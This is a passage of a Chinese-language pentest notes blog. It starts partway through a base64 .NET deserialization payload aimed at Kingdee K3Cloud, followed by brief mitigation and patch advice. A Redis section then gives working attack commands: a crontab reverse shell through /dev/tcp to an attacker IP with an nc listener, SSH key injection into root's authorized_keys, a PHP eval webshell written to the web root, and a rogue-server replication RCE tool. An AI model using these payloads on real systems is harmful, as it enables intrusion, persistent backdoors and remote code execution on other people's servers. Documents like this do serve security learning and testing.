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yZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABASAAAABwAAAAkEAAAACgkoAAAACggIAAAAAAoICAEAAAABEwAAAA8AAAAGKQAAAN8DU3lzdGVtLkxpbnEuRW51bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFAAAAAcAAAAJBQAAAAoJLAAAAAoICAAAAAAKCAgBAAAAARUAAAAPAAAABi0AAADmAlN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFgAAAAcAAAAJBgAAAAkwAAAACTEAAAAKCAgAAAAACggIAQAAAAEXAAAADwAAAAYyAAAA7wFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABAYAAAABwAAAAkHAAAACgk1AAAACggIAAAAAAoICAEAAAABGQAAAA8AAAAGNgAAAClTeXN0ZW0uV2ViLlVJLldlYkNvbnRyb2xzLlBhZ2VkRGF0YVNvdXJjZQQAAAAGNwAAAE1TeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYRAaAAAABwAAAAkIAAAACAgAAAAACAgKAAAACAEACAEACAEACAgAAAAAARsAAAAPAAAABjkAAAApU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5EZXNpZ25lclZlcmIEAAAABjoAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAcAAAABQAAAA0CCTsAAAAICAMAAAAJCwAAAAEdAAAADwAAAAY9AAAANFN5c3RlbS5SdW50aW1lLlJlbW90aW5nLkNoYW5uZWxzLkFnZ3JlZ2F0ZURpY3Rpb25hcnkEAAAABj4AAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5EB4AAAABAAAACQkAAAAQHwAAAAIAAAAJCgAAAAkKAAAAECAAAAACAAAABkEAAAAACUEAAAAEJAAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAgAAAAhEZWxlZ2F0ZQdtZXRob2QwAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCUIAAAAJQwAAAAEoAAAAJAAAAAlEAAAACUUAAAABLAAAACQAAAAJRgAAAAlHAAAAATAAAAAkAAAACUgAAAAJSQAAAAExAAAAJAAAAAlKAAAACUsAAAABNQAAACQAAAAJTAAAAAlNAAAAATsAAAAEAAAACU4AAAAJTwAAAARCAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BlAAAADVAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABlIAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkGUwAAAARMb2FkCgRDAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQlTAAAACT4AAAAJUgAAAAZWAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQZXAAAALlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoU3lzdGVtLkJ5dGVbXSkIAAAACgFEAAAAQgAAAAZYAAAAzAJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAACVIAAAAGWwAAAAhHZXRUeXBlcwoBRQAAAEMAAAAJWwAAAAk+AAAACVIAAAAGXgAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkGXwAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkIAAAACgFGAAAAQgAAAAZgAAAAtgNTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZiAAAAhAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GYwAAAA1HZXRFbnVtZXJhdG9yCgFHAAAAQwAAAAljAAAACT4AAAAJYgAAAAZmAAAARVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbU3lzdGVtLlR5cGVdIEdldEVudW1lcmF0b3IoKQZnAAAAlAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0gR2V0RW51bWVyYXRvcigpCAAAAAoBSAAAAEIAAAAGaAAAAMACU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uQm9vbGVhbiwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZqAAAAHlN5c3RlbS5Db2xsZWN0aW9ucy5JRW51bWVyYXRvcgZrAAAACE1vdmVOZXh0CgFJAAAAQwAAAAlrAAAACT4AAAAJagAAAAZuAAAAEkJvb2xlYW4gTW92ZU5leHQoKQZvAAAAGVN5c3RlbS5Cb29sZWFuIE1vdmVOZXh0KCkIAAAACgFKAAAAQgAAAAZwAAAAvQJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABnIAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQZzAAAAC2dldF9DdXJyZW50CgFLAAAAQwAAAAlzAAAACT4AAAAJcgAAAAZ2AAAAGVN5c3RlbS5UeXBlIGdldF9DdXJyZW50KCkGdwAAABlTeXN0ZW0uVHlwZSBnZXRfQ3VycmVudCgpCAAAAAoBTAAAAEIAAAAGeAAAAMYBU3lzdGVtLkZ1bmNgMltbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4AAAAGegAAABBTeXN0ZW0uQWN0aXZhdG9yBnsAAAAOQ3JlYXRlSW5zdGFuY2UKAU0AAABDAAAACXsAAAAJPgAAAAl6AAAABn4AAAApU3lzdGVtLk9iamVjdCBDcmVhdGVJbnN0YW5jZShTeXN0ZW0uVHlwZSkGfwAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS5UeXBlKQgAAAAKAU4AAAAPAAAABoAAAAAmU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5Db21tYW5kSUQEAAAACToAAAAQTwAAAAIAAAAJggAAAAgIACAAAASCAAAAC1N5c3RlbS5HdWlkCwAAAAJfYQJfYgJfYwJfZAJfZQJfZgJfZwJfaAJfaQJfagJfawAAAAAAAAAAAAAACAcHAgICAgICAgITE9J07irREYv7AKDJDyb3Cws=&quot;,&quot;format&quot;:&quot;3&quot;&#125;</span><br></pre></td></tr></table></figure>





<h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h5><p>8.x版本可通过手动添加安全配置并重启IIS的方式进行缓解，注意管理中心与普通应用配置文件均需添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 普通应用配置：&#123;WebROOT&#125;\Kingdee\K3Cloud\WebSite\App_Data\Common.config</span><br><span class="line"># 管理中心配置：&#123;WebROOT&#125;\Kingdee\K3Cloud\Services\ManagementService\App_Data\Common.config</span><br><span class="line"> </span><br><span class="line">EnabledKDSVCBinary = false</span><br></pre></td></tr></table></figure>

<p>由于该漏洞不仅影响管理中心（默认8000端口），也影响普通应用（默认80端口）。如果其它版本通过限制访问来源临时缓解漏洞，需要考虑是否会中断普通用户Web业务。</p>
<h6 id="升级修复方案"><a href="#升级修复方案" class="headerlink" title="升级修复方案"></a>升级修复方案</h6><p>7.x版本必须先安装全量补丁（修复代码）后安装临时补丁（添加安全配置）</p>
<p>8.x版本管理中心（默认8000端口）默认不对外开放，且包含修复代码。但是直接安装临时补丁可能会失败，所以依旧建议先安装全量补丁（修复代码）后安装临时补丁（添加安全配置）</p>
<h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><h4 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h4><blockquote>
<p>redis以root身份运行</p>
<p>未授权访问或授权口令已知</p>
</blockquote>
<p>在kali中通过<code>redis-cli -h 192.168.100.101 -p 6379</code>连接到redis，输入以下指令利用crontab反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cron表达式格式：&#123;秒数&#125; &#123;分钟&#125; &#123;小时&#125; &#123;日期&#125; &#123;月份&#125; &#123;星期&#125; &#123;年份(可为空)&#125; 命令</span><br><span class="line"># 每分钟执行一次echo &quot;haha&quot;：* * * * * echo &quot;haha&quot;</span><br><span class="line">192.168.100.101:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.100.99/4444 0&gt;&amp;1\n&quot;</span><br><span class="line"></span><br><span class="line"># 设置目录为/var/spool/cron/</span><br><span class="line">192.168.100.101:6379&gt; config set dir /var/spool/cron/</span><br><span class="line"></span><br><span class="line"># 设置文件名为root</span><br><span class="line">192.168.100.101:6379&gt; config set dbfilename root</span><br><span class="line"></span><br><span class="line"># 保存快照到本地</span><br><span class="line">192.168.100.101:6379&gt; save</span><br></pre></td></tr></table></figure>

<p>kali中打开一个新的命令行窗口执行<code>nc -lvnp 4444</code>进行监听，过一会儿就能接收到反弹回来的shell：</p>
<p>由于redis的压缩储存机制，在某些情况下会因为反弹shell的指令被压缩，从而导致反弹shell失败：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.100.101:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.100.100/4444 0&gt;&amp;1\n&quot;</span><br><span class="line">192.168.100.101:6379&gt; save</span><br></pre></td></tr></table></figure>

<p>[root@localhost ~]# cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p>
<ul>
<li>bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.100@&#x2F;4 0&gt;&amp;1</li>
</ul>
<p>当运行redis的用户为普通用户时，会无法出现切换目录失败的情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">config set dir /var/spool/cron</span><br><span class="line">(error) ERR Changing directory: Permission denied</span><br></pre></td></tr></table></figure>

<h4 id="SSH公钥"><a href="#SSH公钥" class="headerlink" title="SSH公钥"></a>SSH公钥</h4><blockquote>
<p>redis以root身份运行</p>
<p>未授权访问或者授权口令已知</p>
<p>服务开启ssh服务且允许密钥登录</p>
</blockquote>
<p>在kali中使用<code>ssh-keygen -t rsa</code>生成密钥：</p>
<p>将生成的公钥保存到本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# (echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; kali</span><br></pre></td></tr></table></figure>

<p>将文件写入redis进行利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将上一步生成的kali文件写入redis并设置键的值为kali</span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# cat kali | redis-cli -h 192.168.100.101 -p 6379 -x set kali</span><br><span class="line"></span><br><span class="line"># 连接redis，并将公钥文件写入/root/.ssh/authorized_keys中</span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# redis-cli -h 192.168.100.101 -p 6379</span><br><span class="line">192.168.100.101:6379&gt; config set dir /root/.ssh/</span><br><span class="line">192.168.100.101:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">192.168.100.101:6379&gt; save</span><br><span class="line"></span><br><span class="line"># 使用密钥进行登录</span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# ssh -i /root/.ssh/id_rsa root@192.168.100.101</span><br></pre></td></tr></table></figure>



<h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><blockquote>
<p>服务器开着web服务且web目录路径已知</p>
<p>未授权访问或者授权口令已知</p>
</blockquote>
<p>倘若服务器运行着LAMP&#x2F;LNMP服务，且已知工作目录为<code>/var/www/html/</code>，可通过以下指令写入webshell，或参考写入SSH公钥的过程写入木马文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set x &quot;&lt;?php @eval($_POST[&#x27;test&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>



<h4 id="主从复制rce"><a href="#主从复制rce" class="headerlink" title="主从复制rce"></a>主从复制rce</h4><blockquote>
<p>redis &lt;&#x3D; 5.0.5</p>
<p>未授权访问</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost &lt;target address&gt; --rport &lt;target port&gt; --lhost &lt;vps address&gt; --lport &lt;vps port&gt;</span><br></pre></td></tr></table></figure>

<p>参数说明</p>
<ul>
<li>–rpasswd 如果目标Redis服务开启了认证功能，可以通过该选项指定密码</li>
<li>–rhost 目标redis服务IP</li>
<li>–rport 目标redis服务端口，默认为6379</li>
<li>–lhost vps的IP地址</li>
<li>–lport vps的端口，默认为21000</li>
</ul>
<h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3><p>Apache RocketMQ NameServer    cve-2023-33246</p>
<blockquote>
